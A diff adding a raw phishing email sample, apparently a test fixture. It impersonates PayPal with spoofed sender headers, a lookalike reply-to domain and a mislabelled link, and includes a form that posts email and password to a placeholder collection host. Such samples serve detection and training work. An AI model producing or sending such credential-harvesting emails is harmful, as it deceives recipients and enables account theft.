@@ -1,0 +1,22 @@
+From: PayPal Security <security@paypal.com>
+To: victim@example.com
+Reply-To: support@paypal-help-login.top
+Subject: Urgent: verify your account
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+<body>
+    <h2>Account suspended</h2>
+    <p>Sign in to continue.</p>
+
+    <a href="https://example.com">
+        https://paypal.com
+    </a>
+
+    <form method="post" action="https://example.com/collect">
+        <input type="email" name="email">
+        <input type="password" name="password">
+        <button type="submit">Verify account</button>
+    </form>
+</body>
+</html>
